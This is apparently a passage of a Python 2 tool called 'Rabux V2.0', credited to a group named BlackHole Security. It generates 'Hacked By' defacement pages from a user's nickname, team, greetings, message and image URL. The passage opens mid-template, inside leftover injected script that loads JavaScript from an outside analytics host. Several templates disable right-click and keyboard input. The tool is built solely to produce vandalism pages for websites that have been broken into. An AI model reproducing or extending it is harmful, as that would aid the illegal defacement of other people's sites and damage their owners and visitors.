Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKG19weUUecCJBVzJxXe2YJP5k6lv25eR87n73F3MQshzomEZUUhiB8GNP34K%2f%2bHltze2BNonGp9y5sDngVEU2DLyNrS57l%2fTTs1UXZ5MnBPDfOqAtYJDSHZLKFFRfNFm40j2QPgvec5%2bfPAt0LqQF8nAfEW6blvQkaI%2bCjvqKfslPBNlhjCr5mQ5USQEsUHK0JJCq6smqL4EQVsWgoQL%2bLtQICXUuLtG7X5W%2feBW4kkyZBwp7USroZGQ81PHY2wbZm114y3duQStTkn4Gz9Hz%2ftcaRutybUfrZHAvv17s5%2fReiFdENQ%2fs5FM4rKJ97ZuL4vs4tTNxmBwPhtynRldu1gyBfxX%2fIKvO9C%2bMc4KMhjf1HEVND%2fvTPBKcgsKdCHJUcXn%2fORYvA6H1mrWvgNGtMA2hM0AxIs6TyvPRuStAkNA4lNH2%2fQ6lXObgkDqa6u6w0S2nJMIpUiV%2bg%2fqiLOLsgdLcGhwvAxyWv6VSKV99q4iPsVgtTLL%2fsdgnaWi0qTSsSJCCV5pO5DNEg2%2bhA%2fVlIqk0ODD2FNV740hxvXbUTxVQqsxbgdlfnGoG%2f%2bRYicxs" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK1gQsJPuI8qD63%2fD9r0Zf3o1yGULruAh8K8tpxOW9BurWeE2mpnMaUdhWi17fFdFFewbFsrXWgRdGzuyf6VqQkn75AWH%2bpxTYIfLd0yzFMwoWh93V4rMzFKqa38wbmVY4ZsUe5DjrU4sxyA5YUgYlPbrpuJNY5qPeP1i7ttjcdneT7Nr7OQpDtKmLXGIZc%2fAlrh81RgmFJC1AUooebPxBd1YFNGqSkkdIiAuBuqvaRD%2f2FoM3xiuxUwL8WEq6UkGcXO%2fMD2QEi285O3SCq3UmSh6zUw3p2nic%2fpnhNKZUTXw3PhFqt0G3S%2fy%2fHWQXX4YfX3NJlbiNcmVPevUpk4lRtCfMM2hrrkIJrRsr3gPbBvsJl5RnL0Dmqc0DaEDcOglwowpdoM51Pho3EgLibqvA%2fmJQaju0qWkoxjMvU7DbO7TRBcxsMHXU7sxjiVrZcF0RC4%2f6UFgYxZ%2fL4GiwXcPyR7F%2bbhPXSwwADY1HJEVBc8EdP7uJOo612xXLZeomowaLphr%2fuTuY7D1y3%2fyvFSL%2blQT1ljYyn3Uv9CUNBf1h3Lk9SLgRhdC4Hg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKO3jUt5yVT2Lr7Y4klWhj2aDhIRxwXwNX8mupPrZk1ziLR78I1LnOn4sVKm7KWx3e6AguUL0hTDOg6dnq3GpzshXb5S839Rq1zY9meOQtFts%2fBS%2fNiaQBRankAvUt6oVFpwtfyc%2fi6wIW8J%2fNa2BGN4SVocMIEw6Q%2bl6gM42TouAMkca%2bHqqFHVi%2fJuZqXETfMzcM9KZYGxN9gOcH%2frHvWvCZNOWvyVTYWQ1IRg8kC4OgAcJ3kaQpmQ92Dih8WkIXmFksUZXGXXKqCQxsYOVqU9Iw5VwQHoZvo0czJMW3BRj9TJ12vJb8WLlVrt9EwLWT6%2bsQACT6eBEon6aydzQThArIj2vgOeDr1SQ%2bdNFoChgIIjEg4dPXP8QFmavwK8EYx3YMWqCtEZqaufLu9L6PI0eNVP95bcIXa0AeyCTRdJ0GbVEEjI9LUX7pnV8MwDoGi8n0Ncd5DAj6SsxVU0kC%2bMJ%2bsa2Ba4FXl6uSiC9wpsPYRZfrIUbopcd2IgPp3c0eQpVVraIAbk405IroaKHe5fCBLMioERvO5uJ2rEDxKU14bm0LQ6yA4Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html> """)

def script6():
	try:
		script = open("script6.html",'w')
	except(IOError):
		print "Error when creating script6.html"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()
		
	# script6.html
	print "Script Design Sixth"
	print 
	name = raw_input("Enter your nick: ")
	team = raw_input("Enter your team name: ")
	greetz = raw_input("Greetz to?: ")
	mail = raw_input("Enter your mail: ")
	sleep(1)
	print " ~ Success"
	print " ~ Script save as script6.html"
	sleep(1.5)
	
	script.write("""

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="XALVADOR_" name="keywords" />
<meta content="width=device-width, initial-scale=1.0 maximum-scale=1.2, user-scalable=yes" name="viewport" />
<meta content="text/html;charset=UTF-8" http-equiv="Content-Type" />
<meta content="public" http-equiv="Cache-Control" />
<meta content="no-cache" http-equiv="Pragma" />
<meta content="XALVADOR_" name="description" />
<meta property="og:image" content="https://woohahfestival.com/wp-content/uploads/2017/11/LilPump_1489x1072_VW-uai-1032x739.jpg"
    <link href="httpsh://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet" type='text/css'>
    <link href="https://fonts.googleapis.com/css?family=Iceland" rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/css?family=Chela+One|Hanalei+Fill" rel="stylesheet">
<title>"""+team+"""</title>
<link rel="SHORTCUT ICON" href=" """+picture+"""" " type="image/png">
</head>
</br>
<style>
body	{
	Background: white;
	Color: black;
	text-align: center;
	font-size: 10pt;
	font-family: 'Dosis', sans-serif;
	letter-spacing: 2px;
	line-height: 25px;
}
{
/*text styling*/
  font-family: "Iceland", sans-serif;
  font-size: 2em;
  text-align: center;
  color: #4c83af;
  margin-top: -20px;
  font-weight: 900;
}
a {
  font-family: "Lato", sans-serif;
  font-size: 1.5em;
  text-align: center;
  color: black;
  font-weight: 900;
  text-decoration: none;
}
kontil {
	font-size: 1; 
	font-family: 'Shadows Into Light Two', cursive;
}
p {
	font-size: 1.5em; 
	font-family: 'Pacifico', cursive;
}
#kedip {text-decoration:blink;
-webkit-animation-name: blink;
-webkit-animation-iteration-count: infinite;
-webkit-animation-timing-function: cubic-bezier(1.0,0,0,1.0);
-webkit-animation-duration: 4s;
}
</style>
<body>
<center>
<img src="https://zippy.gfycat.com/AthleticOilyHarborporpoise.gif?w=521&h=245&crop" height="100"><br>
<b><font color="black"><kontil>Hacked by """+name+""" </kontil><br><br>
<font color="red" face="Chela One" size="1">[ <font color="black">"""+team+""" <font color="red"> ]
<br><font face="Chela One" color="black" size="1">"""+greetz+"""" <font color="red"> PACMAN CROP <font color="black"> - BHSecurity - IndoXploit 
<br>
<br>
<br><b><font face="Lato" color="black" size="1">Contact Me? <font color="red">"""+mail+"""
<audio autoplay="true" src="http://samsiddha.in//Dr-Dre-The-Next-Episode-ft-Snoop-Dogg-Kurupt-Nate-Dogg_QZXc39hT8t4.mp3"></audio>
<body>
<html> """)

def script7():
	try:
		script = open("script7.html",'w')
	except(IOError):
		print "Error when creating script7.html"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()
		
	# script7.html
	print "Script Design Seventh"
	print 
	
	name = raw_input("Enter your nick: ")
	team = raw_input("Entet your team name: ")
	message = raw_input("Enter your message: ")
	sleep(1)
	print " ~ Succes"
	print " ~ Script save as script7.html"
	sleep(1.5)
	
	script.write("""

<title>Hacked By """+name+"""</title>
<style type="text/css">

	body {background-color: black;}
	.matrix { font-size:17pt; text-align:center; width:20px; padding:0px; margin:0px;}
	a:link, a:visited {font-weight:normal; text-decoration:none; color:#00ff00;}
	a:hover {text-decoration:none;}

</style>

<br><br><br><br><br>

<script type="text/javascript" language="JavaScript">

<!--
var rows=5; // must be an odd number
var speed=1; // lower is faster
var reveal=2; // between 0 and 2 only. The higher, the faster the word appears
var effectalign="default" //enter "center" to center it.

var w3c=document.getElementById && !window.opera;;
var ie45=document.all && !window.opera;
var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;
var m_coch=new Array();
var m_copo=new Array();
window.onload=function() {
	if (!w3c && !ie45) return
  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];
  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;
  ma_txt=" "+ma_txt+" ";
  columns=ma_txt.length;
  if (w3c) {
    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);
    ma_tab=document.createElement("table");
    ma_tab.setAttribute("border", 0);
    ma_tab.setAttribute("align", effectalign);
    ma_tab.style.backgroundColor="#000000";
    ma_bod=document.createElement("tbody");
    for (x=0; x<rows; x++) {
      ma_row=document.createElement("tr");
      for (y=0; y<columns; y++) {
        matemp=document.createElement("td");
        matemp.setAttribute("id", "Mx"+x+"y"+y);
        matemp.className="matrix";
        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));
        ma_row.appendChild(matemp);
      }
      ma_bod.appendChild(ma_row);
    }
    ma_tab.appendChild(ma_bod);
    matrix.appendChild(ma_tab);
  } else {
    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';
    for (var x=0; x<rows; x++) {
      ma_tab+='<t'+'r>';
      for (var y=0; y<columns; y++) {
        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'">&nbsp;</'+'td>';
      }
      ma_tab+='</'+'tr>';
    }
    ma_tab+='</'+'table>';
    matrix.innerHTML=ma_tab;
  }
  ma_cho=ma_txt;
  for (x=0; x<columns; x++) {
    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));
    m_copo[x]=0;
  }
  ma_bod=setInterval("mytricks()", speed);
}

function mytricks() {
  x=0;
  for (y=0; y<columns; y++) {
    x=x+(m_copo[y]==100);
    ma_row=m_copo[y]%100;
    if (ma_row && m_copo[y]<100) {
      if (ma_row<rows+1) {
        if (w3c) {
          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);
          matemp.firstChild.nodeValue=m_coch[y];
        }
        else {
          matemp=document.all["Mx"+(ma_row-1)+"y"+y];
          matemp.innerHTML=m_coch[y];
        }
        matemp.style.color="#33ff66";
//        matemp.style.fontWeight="bold";
      }
      if (ma_row>1 && ma_row<rows+2) {
        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];
        matemp.style.fontWeight="normal";
        matemp.style.color="#00ff00";
      }
      if (ma_row>2) {
          matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];
        matemp.style.color="#009900";
      }
      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;
      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);
      else if (ma_row<rows+2) m_copo[y]++;
      else if (m_copo[y]<100) m_copo[y]=0;
    }
    else if (Math.random()>0.9 && m_copo[y]<100) {
      m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));
      m_copo[y]++;
    }
  }
  if (x==columns) clearInterval(ma_bod);
}

function zoomer(ycol) {
  var mtmp, mtem, ytmp;
  if (m_copo[ycol]==Math.floor(rows/2)+1) {
    for (ytmp=0; ytmp<rows; ytmp++) {
      if (w3c) {
        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);
        mtmp.firstChild.nodeValue=m_coch[ycol];
      }
      else {
        mtmp=document.all["Mx"+ytmp+"y"+ycol];
        mtmp.innerHTML=m_coch[ycol];
      }
      mtmp.style.color="#00ff00";
//      mtmp.style.color="#33ff66";
//      mtmp.style.fontWeight="bold";
    }
    if (Math.random()<reveal) {
      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));
      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);
    }
    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);
    m_copo[ycol]+=199;
    setTimeout("zoomer("+ycol+")", speed);
  }
  else if (m_copo[ycol]>200) {
    if (w3c) {
      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);
      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);
    }
    else {
      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];
      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
    }
    mtmp.style.fontWeight="normal";
    mtem.style.fontWeight="normal";
    setTimeout("zoomer("+ycol+")", speed);
  }
  else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);
  if (m_copo[ycol]>100 && m_copo[ycol]<200) {
    if (w3c) {
      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);
      mtmp.firstChild.nodeValue=String.fromCharCode(160);
      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);
      mtem.firstChild.nodeValue=String.fromCharCode(160);
    }
    else {
      mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];
      mtmp.innerHTML=String.fromCharCode(160);
      mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];
      mtem.innerHTML=String.fromCharCode(160);
    }
    setTimeout("zoomer("+ycol+")", speed);
  }
}
// -->
</script>

<div align=center id="matrix">
            
Hacked By """+name+"""
            
</div>

<br><br>

<font face="courier new"><font size="5" color=#00ff00>
<center>
"""+message+"""
<br>

"""+team+"""

</center>
</font>
<font face="courier new"><font size="2" color=#00ff00>
<pre><center>
""")

def script8():
	try:
		script = open("script8.html",'w')
	except(IOError):
		print "Error when creating script8.html"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()
		
	# script8.html
	print "Script Design Eight"
	print 
	name = raw_input("Enter your nickname: ")
	team = raw_input("Enter your team name: ")
	slogan = raw_input("Enter your team slogan: ")
	message = raw_input("Enter your message: ")
	picture = raw_input("Enter your picture url: ")
	greetz = raw_input("Greetz to?: ")
	
	sleep(1)
	print " ~ Success"
	print " ~ Script save as script8.html"
	sleep(1.5)
	
		
	script.write("""
	

<html>
     <head>
          <title>Hacked By """+name+""" - """+team+"""</title> 
     	 <link rel="shortcut icon" type="image/x-icon" href=" """+picture+""" "/> 
<meta name="robots" content="index, follow" /> 
<meta name="keywords" content="Hacked!!"/> 
<meta name="title" content="Hacked By """+name+""" "/> 
<meta name="author" content=" """+name+""" "/> 
<meta name="description" content="Fucked~!, Hacked~?"/>
 <style> @import url('https://fonts.googleapis.com/css?family=Orbitron'); @import url('https://fonts.googleapis.com/css?family=Exo+2');
  @import url('https://fonts.googleapis.com/css?family=Iceberg');
   body { margin-top: 180px; 
    margin: 0px;
    padding: 0px; 
    padding-bottom: 50px;             
    background-color: white; 
    background: url('http://www.madtomatoe.com/wp-content/uploads/2010/11/matrix-animated-image.gif	') center no-repeat fixed; 
    background-size: cover; 
    font-family: 'Orbitron' ;
    cursor: url(../cur.cursors-4u.net/cursors/cur-9/cur865.ani), url(../store2.up-00.com/2016-09/1473247935531.png), progress !important; 
    
    } 
    #bshx32_main 
    { 
    margin-top: 170px; 
    width: 950px; 
    background: rgba(0,0,0,0.2);
    text-align: center; 
    margin-left: auto;
    margin-right: auto; 
    margin-bottom: auto;
    } h1 {  color: white; margin: 0px; 
    padding: 0px; 
    font-family: 'Iceberg'; 
    font-weight: normal; 
    font-size: 80px; 
    
    } 
    .shred 
    { 
    text-shadow: 0px 0px 12px #008fb3, -1px 0 black, 0 1px #008fb3, 1px 0 black, 0 -1px #008fb3;
    } 
    .shwhite 
    {
    text-shadow: 0px 0px 12px #fff, -1px 0 black, 0 1px #fff, 1px 0 black, 0 -1px #fff; 
    
    } 
    .bshx32_mes 
    {
    color: white; 
    font-size: 18px; 
    font-weight: lighter;
    } 
    a 
    { 
    color: #385164; 
    text-decoration: underline;
    } a:hover { color: #385164; 
    text-decoration: underline; 
    
    } a:active { color: #385164; 
    text-decoration: none; 
    background: white; 
    
    } a:visited 
    { 
    color: #385164; 
    text-decoration: none; 
    
    } 
    .blink_text 
    { 
    -webkit-animation-name: blinker; 
    -webkit-animation-duration: 2s; 
    -webkit-animation-timing-function: linear; 
    -webkit-animation-iteration-count: infinite; 
    -moz-animation-name: blinker; 
    -moz-animation-duration: 1s; 
    -moz-animation-timing-function: linear; 
    -moz-animation-iteration-count: infinite; 
    animation-name: blinker; 
    animation-duration: 1s; 
    animation-timing-function: linear; 
    animation-iteration-count: infinite; 
    color: #385164; 
    
    } 
    @-moz-keyframes blinker 
    { 
    0% { opacity: 1.0; 
    
    } 50% { opacity: 0.0; 
    
    } 100% { opacity: 1.0; 
    
    } } @-webkit-keyframes blinker { 
    0% { opacity: 1.0; 
    
    } 50% { opacity: 0.0; 
    
    } 100% { opacity: 1.0; 
    
    } } @keyframes blinker { 
    0% { opacity: 1.0; 
    
    } 50% { opacity: 0.0; 
    
    } 100% { opacity: 1.0; } } 
    </style> 
   </head>
       <center><img border="0" src=" """+picture+""" " width="450" height="360"></p></center>
    <p align="center">&nbsp;</p>
  <body> <div id="bshx32_main"> <div class="blinxk_text"> <h1> 
  <span class="shred">Hacked By 
  <span class="shwhite">"""+name+"""</h1> 
</div>
 <br> <font color="lime">"""+message+"""</font></br></p>
 <h3 style="color: lime" class="blink_text"> """+team+""", """+slogan+"""</h3> <div id="bcg_we_are">
 	 <div> 
  <font color="red">~ Greetz To """+team+"""  Members ~</font></div> 
    <marquee behavior="alternate" scrollamount="13" style="border: 2px dotted lime; width: 50%;" align="center">
-      <font face="Poiret One" size="4" color="white">
        <b>
        	"""+greetz+"""
       </b>
    </marquee>
    </font>
        <br/>
  </div>
 </body>
 </html> """)
 
def script9():
	try:
		script = open("script9.html",'w')
	except(IOError):
		print "Error when creating script9.html"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()
		
	# script9.html
	print "Script Design Nineth"
	print 
	
	name = raw_input("Enter your nickname: ")
	picture = raw_input("Enter your picture url: ")
	country = raw_input("Enter your country name: ")
	team = raw_input("Enter your team name: ")
	print "Enter member nick of your team"
	memberoneth = raw_input("member nick: ")
	membersecondth = raw_input("member nick: ")
	memberthird = raw_input("member nick: ")
	memberfourth = raw_input("member nick: ")
	memberfiveth = raw_input("member nick: ")
	membersixth = raw_input("member nick: ")
	memberseventh = raw_input("member nick: ")
	membereight = raw_input("member nick: ")
	membernineth = raw_input("member nick: ")
	membertenth = raw_input("member nick: ")
	
	sleep(1)
	print " ~ Succes "
	print " ~ script save as script9.html"
	sleep(1.5)
	
	script.write("""

<DOCTYPE HTML!>
<html>
<head>
<title>Hacked By """+name+""" </title>
<meta name="description" content="Hacked">
</head>
<body bgcolor="black">
<center><font color="red" size="20">Hacked By """+name+"""<br></font></font></font></font></center>
<center><img src=" """+picture+""" " height="250">
<p><font color="white" size="5">"""+country+""" HACKER</font></p>
<center><br><font color="red">.:: """+team+""" ::.</font></br></center>
<center><br><font color="white">We are:</font></br><br></center>
<center><font color="red">[ </font><font color="aqua">"""+name+"""</font><font color="red"> ]<font color="red">[ </font><font color="white">"""+memberoneth+"""</font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+membersecondth+"""</font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+memberthird+"""</font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+memberfourth+""" </font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+memberfiveth+"""</font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+membersixth+"""</font><font color="red"> ]</font>
<font color="red">[ </font><font color="white">"""+memberseventh+"""</font><font color="red"> ]</font><font color="red">[</font><font color="white">"""+membereight+"""</font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+membernineth+"""</font><font color="red"> ]</font><font color="red">[ </font><font color="white">"""+membertenth+"""</font>
</body> 
</html> """)

def script10():
	try:
		script = open("script10.html",'w')
	except(IOError):
		print "Error when creating script10.html"
		print "Is back to the menu..."
		
		sleep(0.5)
		show_menu()
		
	# script10.html
	print "Script Design Tenth"
	print 
	
	name = raw_input("Enter your nickname: ")
	picture = raw_input("Enter your picture url: ")
	message = raw_input("Enter your message: ")
	team = raw_input("Enter your team name: ")
	greetz = raw_input("Greetz to? : ")
	
	sleep(0.5)
	print " ~ Success"
	print " ~ script save as script10.html"
	sleep(1.5)
	
	script.write("""


<html><head> 
<title>&#1203;&#824;&#1202;&#824;&#1203; Hacked by """+name+""" &#1203;&#824;&#1202;&#824;&#1203;</title>
<link REL="SHORTCUT ICON" HREF=" """+picture+""" ">
<meta content='Hacked' name='description'/>
<meta content='Hacked' name='keywords'/>
<meta content='Hacked' name='Abstract'/>
<meta name="description" content="Hacked By """+name+""" ">
<meta name="keywords" content="Hacked">
<meta name="googlebot" content="index,follow" />
<meta name="robots" content="all" />
<meta name="robots schedule" content="auto" />

<!-- This script is design, made, by Typical Idiot Security -->
<meta name="Copyright" content="Typical Idiot Security" />
<meta contact='https://www.google.com'/> 
<link href='https://fonts.googleapis.com/css?family=New+Rocker' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'>
</head>
<script type="text/javascript">

var snowmax=35
var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
var snowletter="*"
var sinkspeed=0.6
var snowmaxsize=22
var snowminsize=8
var snowingzone=1

// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script>
<br>
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' bgcolor="black" > 
<center>
<img class="shrinkToFit decoded" height="200" width="200"  
src=" """+picture+""" " id="productimage" alt=" """+name+""" ">
<br><br><b>
</b></font><br><font color="red" face="Jolly Lodger" size="5">
"""+message+"""
</b></font><br><font color="red" face="New Rocker" size="4">
&#1203;&#824;&#1202;&#824;&#1203; Hacked by """+name+""" &#1203;&#824;&#1202;&#824;&#1203;<br>"""+team+"""</font><br>
<br><font color="red" face="New Rocker" size="4">
"""+greetz+"""
</center>
</body></html> """)


		

		
	
	
	
		
		

# Pembuatan banner
def banner():
	print 
	print " >>>>>>>>>>> Rabux V2.0 <<<<<<<<<<<<"
	print " 	  BlackHole Security"
	print " 	  17-7-2K18 (16.34) "
	print " 		ZetSec "
	print " >>> HUMAN ARE THE REAL MONSTER <<<"
	
	
	
	
def show_menu():
	print 
	print " ~ Script 1\t ~ Script 2"
	print " ~ Script 3\t ~ Script 4"
	print " ~ Script 5\t ~ Script 6"
	print " ~ Script 7\t ~ Script 8"
	print " ~ Script 9\t ~ Script 10"
	print 
	print " [q] Exit "
	print 
	
	
	menu = raw_input("rby_> ")
	if menu == "1":
		script1()
	elif menu == "2":
		script2()
	elif menu == "3":
		script3()
	elif menu == "4":
		script4()
	elif menu == "5":
		script5()
	elif menu == "6":
		script6()
	elif menu == "7":
		script7()
	elif menu == "8":
		script8()
	elif menu == "9":
		script9()
	elif menu == "10":
		script10()
	elif menu == "q" :
		print "Exiting..."
		sleep(1)
		sys.exit()
	else:
		print "Wrong input"
		show_menu()
		
if __name__ == "__main__":
	while(True):
		banner()
		show_menu()
		
	